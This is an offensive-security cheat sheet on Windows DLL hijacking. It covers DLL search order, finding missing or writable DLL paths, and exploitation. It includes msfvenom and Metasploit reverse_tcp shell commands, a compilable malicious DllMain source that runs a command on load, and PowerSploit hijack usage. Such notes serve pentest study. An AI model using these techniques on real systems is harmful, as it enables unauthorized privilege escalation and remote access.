# Windows DLL Hijacking

- If a program loads a DLL from a directory you can write to, you can modify the DLL and load your own code instead
- Will run with the privileges of the program running the DLL
- If a DLL doesn't exist, you could attempt to write it to a location on the search order. 

## Windows Search Order

#### SafeDLLSearchMode

```
HKEY_LOCAL_MACHINE\system\CurrentControlSet\Control\Session Manager\SafeDLLSearchMode
```

- This registry key, if enabled places the the user's current directory later in the search order.  It is enabled by default from Windows XP SP2

### If SafeDLLSearchMode is enabled

https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-security

1. Directory from which the application loaded
2. The system directory
3. The 16-bit system directory
4. The windows directory
5. The current directory
6. Directories listed in PATH environment variable.

### If SafeDLLSearchMode is Disabled

1. The directory from which the application loaded
2. The current directory
3. The system directory
4. The 16-bit system directory
5. The windows directory
6. Directories listed in PATH environment variable

## Enumeration

https://docs.microsoft.com/en-us/sysinternals/downloads/procmon

- You can use process monitor to find Dll with name not found. 
- Filters:

```
result is NAME NOT FOUND
Path ends with .dll
```

- Review the permissions on the folders 

```
icacls <folder>

accesschk.exe -dqv <folder>

Get-Acl -Path <folder> | fl
```

- Powersploit

  https://powersploit.readthedocs.io/en/latest/Privesc/Find-ProcessDLLHijack/

  https://powersploit.readthedocs.io/en/latest/Privesc/Find-PathDLLHijack/

```
Find-ProcessDLLHijack
Find-ProcessDLLHijack -ExcludeWindows -ExcludeProgramFiles
Find-PathDLLHijack
```

## Exploitation

### Metasploit

```
use multi/handler
set payload windows.meterpreter/reverse_tcp
set LHOST

msfvenom -p windows/meterpreter/reverse_tcp lhost= -f exe -o program.exe
```

- Copy the payload to the host
- Replace the affected binary 

### Malicious DLL

https://github.com/sagishahar/scripts/blob/master/windows_dll.c

```
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami > C:\\Windows\\Temp\\dll.txt");
        ExitProcess(0);
    }
    return TRUE;
}
```

- Compile and place into the folder

### PowerSploit

- Write-HijackDLL

  https://powersploit.readthedocs.io/en/latest/Privesc/Write-HijackDll/

  - builds a self-deleting bat file that executes a command. It patches this into a C++DLL that is build to be hijackable bu the IKEEXT service. 

```
Write-HijackDLL -Command '' -BatPath file.bat
```

